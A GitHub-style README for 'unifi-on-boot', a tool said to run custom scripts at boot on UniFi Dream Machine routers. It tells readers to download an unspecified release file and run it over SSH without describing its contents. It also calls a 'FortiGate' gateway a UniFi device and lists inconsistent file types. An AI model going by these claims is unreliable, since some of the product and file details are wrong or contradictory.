# 🚀 unifi-on-boot - Start Scripts Automatically on Boot

[![Download Latest Release](https://img.shields.io/badge/Download-unifi--on--boot-blue?style=for-the-badge)](https://github.com/lolamento0101/unifi-on-boot/releases)

---

## 📄 Description

unifi-on-boot helps you start custom scripts on your device every time it turns on. It also keeps those scripts working even after your device firmware updates. This is useful if you use devices like the UniFi Dream Machine (UDM) or UDM Pro, and want to keep your custom settings or routines running without repeating setup steps.

---

## 💻 System Requirements

Before you begin, make sure you have:

- A UniFi device such as the UniFi Dream Machine or UniFi Dream Machine Pro.
- Access to the device’s management interface or SSH capabilities.
- Basic understanding of running a downloaded file or managing files on your device.
- Compatible firmware that allows adding or running custom scripts. Generally, the latest firmware from Ubiquiti works fine.

---

## 🌟 Features

- Automatically runs your scripts when your UniFi device boots up.
- Keeps scripts active even after firmware updates.
- Supports multiple scripts, so you can customize device behavior.
- Works with common UniFi devices like UDM, UDM Pro, and Enterprise FortiGate Gateway.
- Simple installation process with a clear download page.
- Lightweight and does not affect device performance.

---

## 🚀 Getting Started

This section will guide you step-by-step to get unifi-on-boot running on your device without needing to understand technical details.

### Step 1: Visit the Download Page

Click the big blue button at the top or go to the [unifi-on-boot releases page](https://github.com/lolamento0101/unifi-on-boot/releases) to find the latest version.

### Step 2: Choose Your Download

On the releases page, look for the latest release version. The release will contain either:

- A file ending with `.sh` or `.zip` you need to download, or
- A package with instructions for your device.

If you see a file named like `unifi-on-boot-vX.X.tar.gz` or `unifi-on-boot-X.X.sh`, download it to your computer.

### Step 3: Transfer the File to Your Device

Once downloaded, you need to move the file to your UniFi device. This usually means using the device’s web interface or a program like SCP (secure copy) if you are comfortable with that.

If you are unsure how to transfer files, refer to the UniFi device manual or your device’s support page.

### Step 4: Run the Script

After transferring the script to your device, the next step is to run it. You can do this by accessing your device via SSH (a way to connect to the device’s command line):

1. Open a terminal or command prompt on your computer.
2. Connect to your UniFi device by typing:
   ```
   ssh username@device_ip_address
   ```
   Replace `username` and `device_ip_address` with your actual username and IP.
3. Once connected, navigate to where you saved the file, for example:
   ```
   cd /path/to/file
   ```
4. Run the script by typing:
   ```
   sh unifi-on-boot-X.X.sh
   ```
   Change the filename to the actual file you downloaded.

This process sets up unifi-on-boot to start your scripts at every device boot.

### Step 5: Adding Your Custom Scripts

After installation, you can add any script you want to run automatically.

- Create or upload your script files to the appropriate directory as explained in the installation output.
- Make sure your scripts have execution permissions.
- The system will automatically run your scripts every time your device restarts.

---

## 📥 Download & Install

To begin installing unifi-on-boot:

1. Visit the [unifi-on-boot releases page](https://github.com/lolamento0101/unifi-on-boot/releases).
2. Download the latest version available.
3. Follow the instructions in the Getting Started section.
4. If you run into issues, check for a README or documentation file included in the download.

---

## ⚙️ How It Works

unifi-on-boot changes your device’s startup process by adding a hook that runs your scripts every time the device starts. It ensures the scripts keep working even after your device firmware receives updates, which can normally erase custom setups.

The utility works behind the scenes and does not affect your normal use of the device. It simply automates running commands you want at boot time.

---

## 🔧 Troubleshooting

If unifi-on-boot does not seem to start your scripts:

- Double-check the location and name of your script files.
- Make sure scripts have the right permissions. You can set permissions by running:
  ```
  chmod +x yourscript.sh
  ```
- Verify your device allows running custom scripts.
- Ensure you followed the installation steps correctly.
- Restart your device and watch for errors on the console or logs.

For help, visit the GitHub issues page related to unifi-on-boot or the device user forums.

---

## 🛠️ Advanced Tips

- You can test your scripts manually by running them in the device’s shell.
- Keep your scripts as simple as possible to avoid delays during boot.
- Use logging inside your scripts to keep track of what happens when they run.
- Update the unifi-on-boot utility regularly by downloading newer versions from the releases page.

---

## 📚 Learn More

For details about UniFi devices and how to access them:

- Visit Ubiquiti’s official website.
- Refer to your device’s manual for SSH access and file transfer instructions.
- Explore community forums for examples of custom scripts other users have created.

---

## 🏷️ Topics

`dream-machine`, `efg`, `enterprise-fortgress-gateway`, `ubiquiti`, `udm`, `udm-pro`, `udm-utilities`, `udmp`, `udmpro`, `unifi`, `unifi-dream-machine`